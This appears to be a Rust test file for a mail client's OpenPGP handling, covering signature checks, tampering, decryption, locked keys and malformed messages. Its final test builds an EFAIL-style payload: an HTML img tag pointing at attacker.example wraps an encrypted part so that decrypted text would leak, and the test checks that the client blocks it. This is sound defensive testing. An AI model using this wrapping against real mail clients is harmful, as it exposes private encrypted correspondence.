//! Messages produced by GnuPG 2.4 and wrapped the way Thunderbird does it
//! (`corpus/crypto/pgp/`, see its README): Nail must read them.

use crate::common::{Env, fixture, subject_and_text};
use nail_api::security::{DecryptionState, HeaderProtection, SignatureState, TrustLevel};
use pretty_assertions::assert_eq;

#[test]
fn pgp_mime_signed_by_a_known_key_is_valid() {
    let env = Env::with(&["alice.pub.asc"]);
    let outcome = env.read(&fixture("signed-alice.eml"));
    let status = outcome.status.unwrap();
    assert!(status.encryption.is_none() && !status.inline_pgp && !status.partial);
    assert_eq!(status.signatures.len(), 1);
    let sig = &status.signatures[0];
    assert_eq!(sig.state, SignatureState::Valid);
    assert_eq!(sig.signer.as_deref(), Some("alice@example.org"));
    assert!(sig.signer_matches_from);
    assert_eq!(sig.trust, TrustLevel::Unknown);
    assert!(sig.key_id.is_some());
    assert_eq!(sig.fingerprint.as_deref().map(str::len), Some(40));
    assert!(sig.signed_at.is_some());
    assert_eq!(status.header_protection, HeaderProtection::None);
    // The display message is the signed content without the signature.
    let display = outcome.display.unwrap();
    let (subject, text) = subject_and_text(&display);
    assert_eq!(subject, "Signed by Alice");
    assert!(text.contains("signed by Alice"), "{text}");
    assert!(!String::from_utf8_lossy(&display).contains("PGP SIGNATURE"));
}

#[test]
fn tampered_pgp_mime_signature_is_invalid() {
    let env = Env::with(&["alice.pub.asc"]);
    let status = env.status(&fixture("signed-alice-tampered.eml"));
    assert_eq!(status.signatures[0].state, SignatureState::Invalid);
    assert!(!status.all_signatures_valid());
}

#[test]
fn unknown_signer_is_reported_with_the_issuer_fingerprint() {
    let env = Env::new();
    let status = env.status(&fixture("signed-alice.eml"));
    let sig = &status.signatures[0];
    assert_eq!(sig.state, SignatureState::UnknownKey);
    assert_eq!(sig.key_id, None);
    assert_eq!(sig.signer, None);
    // GnuPG writes the issuer fingerprint subpacket.
    let alice = Env::with(&["alice.pub.asc"]);
    let key = alice
        .keyring()
        .list(&nail_api::security::KeyFilter::default())
        .unwrap()
        .remove(0);
    assert_eq!(sig.fingerprint.as_deref(), Some(key.fingerprint.as_str()));
}

#[test]
fn rsa_signature_with_protected_headers() {
    let env = Env::with(&["carol.pub.asc"]);
    let outcome = env.read(&fixture("signed-carol-rsa.eml"));
    let status = outcome.status.unwrap();
    assert_eq!(status.signatures[0].state, SignatureState::Valid);
    assert_eq!(status.header_protection, HeaderProtection::Protected);
    let (subject, text) = subject_and_text(&outcome.display.unwrap());
    assert_eq!(subject, "RSA signed");
    assert!(text.contains("RSA key"), "{text}");
}

#[test]
fn signature_made_before_the_key_expired_stays_valid() {
    let env = Env::with(&["dave.pub.asc"]);
    let status = env.status(&fixture("signed-dave-2020.eml"));
    let sig = &status.signatures[0];
    assert_eq!(sig.state, SignatureState::Valid);
    assert!(sig.signed_at.as_deref().unwrap().starts_with("2020-06-01"));
    // The key itself is expired now.
    assert!(
        env.keyring()
            .list(&nail_api::security::KeyFilter::default())
            .unwrap()[0]
            .expired
    );
}

#[test]
fn encrypted_to_bob_decrypts_with_his_keychain_protected_key() {
    let env = Env::with(&["bob.sec.asc"]);
    for name in ["encrypted-to-bob.eml", "encrypted-to-bob-ocb.eml"] {
        let outcome = env.read(&fixture(name));
        let status = outcome.status.unwrap();
        let encryption = status.encryption.unwrap();
        assert_eq!(encryption.state, DecryptionState::Decrypted, "{name}");
        assert!(encryption.key_id.is_some());
        assert!(
            !encryption.recipients.is_empty(),
            "{:?}",
            encryption.recipients
        );
        assert!(status.signatures.is_empty(), "{:?}", status.signatures);
        let (subject, text) = subject_and_text(&outcome.display.unwrap());
        assert_eq!(subject, "Encrypted");
        assert!(text.contains("Only Bob can read this."), "{name}: {text}");
    }
}

#[test]
fn encrypted_to_someone_else_has_no_key() {
    let env = Env::with(&["bob.sec.asc", "carol.pub.asc"]);
    let outcome = env.read(&fixture("encrypted-to-carol.eml"));
    let encryption = outcome.status.unwrap().encryption.unwrap();
    assert_eq!(encryption.state, DecryptionState::NoKey);
    assert_eq!(encryption.recipients.len(), 1);
    assert!(outcome.display.is_none());
}

#[test]
fn passphrase_protected_key_is_locked_until_unlocked() {
    let env = Env::new();
    let alice = env.import("alice.sec.asc");
    let raw = fixture("encrypted-to-bob.eml"); // also encrypted to alice
    let encryption = env.status(&raw).encryption.unwrap();
    assert_eq!(encryption.state, DecryptionState::Locked);
    assert_eq!(encryption.key_id.as_ref(), Some(&alice));
    env.keyring().unlock(&alice, "alice", None).unwrap();
    let encryption = env.status(&raw).encryption.unwrap();
    assert_eq!(encryption.state, DecryptionState::Decrypted);
    assert_eq!(encryption.key_id.as_ref(), Some(&alice));
}

#[test]
fn signed_and_encrypted_with_protected_subject() {
    let env = Env::with(&["bob.sec.asc", "alice.pub.asc"]);
    let raw = fixture("signed-encrypted-alice-to-bob.eml");
    // On the wire the subject is hidden.
    assert_eq!(subject_and_text(&raw).0, "...");
    let outcome = env.read(&raw);
    let status = outcome.status.unwrap();
    assert_eq!(
        status.encryption.as_ref().unwrap().state,
        DecryptionState::Decrypted
    );
    crate::common::assert_signed_by_sender(&status);
    let (subject, text) = subject_and_text(&outcome.display.unwrap());
    assert_eq!(subject, "Secret plans");
    assert!(text.contains("The meeting is at noon."), "{text}");

    // Without alice's key the signature's signer is unknown, but the
    // content still decrypts.
    let env = Env::with(&["bob.sec.asc"]);
    let status = env.status(&raw);
    assert_eq!(status.signatures[0].state, SignatureState::UnknownKey);
    assert_eq!(status.encryption.unwrap().state, DecryptionState::Decrypted);
}

#[test]
fn inline_signed_message() {
    let env = Env::with(&["alice.pub.asc"]);
    let outcome = env.read(&fixture("inline-signed-alice.eml"));
    let status = outcome.status.unwrap();
    assert!(status.inline_pgp && !status.partial);
    assert_eq!(status.signatures[0].state, SignatureState::Valid);
    let (_, text) = subject_and_text(&outcome.display.unwrap());
    assert!(text.contains("this is an inline signed message."), "{text}");
    assert!(!text.contains("BEGIN PGP"), "{text}");

    // Changing the signed text breaks the signature.
    let tampered = String::from_utf8(fixture("inline-signed-alice.eml"))
        .unwrap()
        .replace("inline signed", "inline forged");
    let status = env.status(tampered.as_bytes());
    assert_eq!(status.signatures[0].state, SignatureState::Invalid);
}

#[test]
fn inline_encrypted_and_signed_message() {
    let env = Env::with(&["bob.sec.asc", "alice.pub.asc"]);
    let outcome = env.read(&fixture("inline-encrypted-to-bob.eml"));
    let status = outcome.status.unwrap();
    assert!(status.inline_pgp);
    assert_eq!(status.encryption.unwrap().state, DecryptionState::Decrypted);
    assert_eq!(status.signatures[0].state, SignatureState::Valid);
    let (_, text) = subject_and_text(&outcome.display.unwrap());
    assert!(text.contains("this is an inline signed message."), "{text}");

    // Without a key: no-key, and the armored text is left as it is.
    let env = Env::new();
    let outcome = env.read(&fixture("inline-encrypted-to-bob.eml"));
    assert_eq!(
        outcome.status.unwrap().encryption.unwrap().state,
        DecryptionState::NoKey
    );
}

#[test]
fn plain_mail_has_no_status() {
    let env = Env::with(&["alice.pub.asc"]);
    let outcome = env.read(&fixture("autocrypt-alice.eml"));
    assert_eq!(outcome.status, None);
    assert_eq!(outcome.display, None);
}

#[test]
fn inline_block_inside_a_multipart_with_extra_text_is_partial() {
    let env = Env::with(&["alice.pub.asc"]);
    let raw = String::from_utf8(fixture("inline-signed-alice.eml")).unwrap();
    let (head, body) = raw.split_once("\r\n\r\n").unwrap();
    let head = head.replace(
        "Content-Type: text/plain; charset=UTF-8\r\nContent-Transfer-Encoding: 7bit",
        "Content-Type: multipart/mixed; boundary=\"m\"",
    );
    let wrapped = format!(
        "{head}\r\n\r\nThis is a multi-part message.\r\n--m\r\nContent-Type: text/plain\r\n\r\nQuoted by a list:\r\n{body}\r\n--m\r\nContent-Type: application/octet-stream\r\nContent-Disposition: attachment; filename=\"x.bin\"\r\n\r\nAAAA\r\n--m--\r\n"
    );
    let outcome = env.read(wrapped.as_bytes());
    let status = outcome.status.unwrap();
    assert!(status.inline_pgp && status.partial);
    assert_eq!(status.signatures[0].state, SignatureState::Valid);
    let display = outcome.display.unwrap();
    let (_, text) = subject_and_text(&display);
    assert!(text.contains("Quoted by a list:"), "{text}");
    assert!(text.contains("this is an inline signed message."), "{text}");
    assert!(!text.contains("BEGIN PGP"), "{text}");
    let display = String::from_utf8(display).unwrap();
    assert!(display.contains("This is a multi-part message."));
    assert!(display.contains("filename=\"x.bin\""));
}

#[test]
fn malformed_protection_is_reported_not_fatal() {
    let env = Env::with(&["alice.pub.asc", "bob.sec.asc"]);
    // A signature part without an OpenPGP signature.
    let raw = String::from_utf8(fixture("signed-alice.eml")).unwrap();
    let start = raw.find("-----BEGIN PGP SIGNATURE-----").unwrap();
    let end = raw.find("-----END PGP SIGNATURE-----").unwrap() + 27;
    let broken = format!("{}not a signature{}", &raw[..start], &raw[end..]);
    let status = env.status(broken.as_bytes());
    assert_eq!(status.signatures[0].state, SignatureState::Error);

    // multipart/encrypted without the payload part.
    let raw = String::from_utf8(fixture("encrypted-to-bob.eml")).unwrap();
    let cut = raw
        .find("--------------enc0Bnd4ry\r\nContent-Type: application/octet-stream")
        .unwrap();
    let truncated = format!("{}--------------enc0Bnd4ry--\r\n", &raw[..cut]);
    let status = env.status(truncated.as_bytes());
    assert_eq!(status.encryption.unwrap().state, DecryptionState::Failed);

    // An armored payload that is not an OpenPGP message.
    let start = raw.find("-----BEGIN PGP MESSAGE-----").unwrap();
    let garbage = format!(
        "{}-----BEGIN PGP MESSAGE-----\r\n\r\nAAAA\r\n-----END PGP MESSAGE-----\r\n\r\n--------------enc0Bnd4ry--\r\n",
        &raw[..start]
    );
    let status = env.status(garbage.as_bytes());
    assert_eq!(status.encryption.unwrap().state, DecryptionState::Failed);
}

/// EFAIL-style wrapping: protected content must never be merged with
/// unprotected parts without saying so.
#[test]
fn wrapped_encrypted_parts_are_not_mixed_with_unprotected_content() {
    let env = Env::with(&["bob.sec.asc", "alice.pub.asc"]);
    // A PGP/MIME encrypted entity nested inside multipart/mixed between
    // HTML parts is not decrypted at all.
    let raw = String::from_utf8(fixture("encrypted-to-bob.eml")).unwrap();
    let (head, body) = raw.split_once("\r\n\r\n").unwrap();
    let ct_start = head.find("Content-Type: multipart/encrypted").unwrap();
    let encrypted_entity = format!("{}\r\n\r\n{body}", &head[ct_start..]);
    let wrapped = format!(
        "{}Content-Type: multipart/mixed; boundary=\"w\"\r\n\r\n--w\r\nContent-Type: text/html\r\n\r\n<img src=\"http://attacker.example/?\r\n--w\r\n{encrypted_entity}\r\n--w\r\nContent-Type: text/html\r\n\r\n\">\r\n--w--\r\n",
        &head[..ct_start]
    );
    let outcome = env.read(wrapped.as_bytes());
    assert_eq!(outcome.status, None);
    assert_eq!(outcome.display, None);

    // An inline encrypted block next to an HTML part is decrypted, but
    // the message is marked partial.
    let inline = String::from_utf8(fixture("inline-encrypted-to-bob.eml")).unwrap();
    let (head, body) = inline.split_once("\r\n\r\n").unwrap();
    let head = head.replace(
        "Content-Type: text/plain; charset=UTF-8\r\nContent-Transfer-Encoding: 7bit",
        "Content-Type: multipart/mixed; boundary=\"w\"",
    );
    let mixed = format!(
        "{head}\r\n\r\n--w\r\nContent-Type: text/html\r\n\r\n<p>unprotected</p>\r\n--w\r\nContent-Type: text/plain\r\n\r\n{body}\r\n--w--\r\n"
    );
    let status = env.status(mixed.as_bytes());
    assert!(status.inline_pgp && status.partial);
    assert_eq!(status.encryption.unwrap().state, DecryptionState::Decrypted);
}
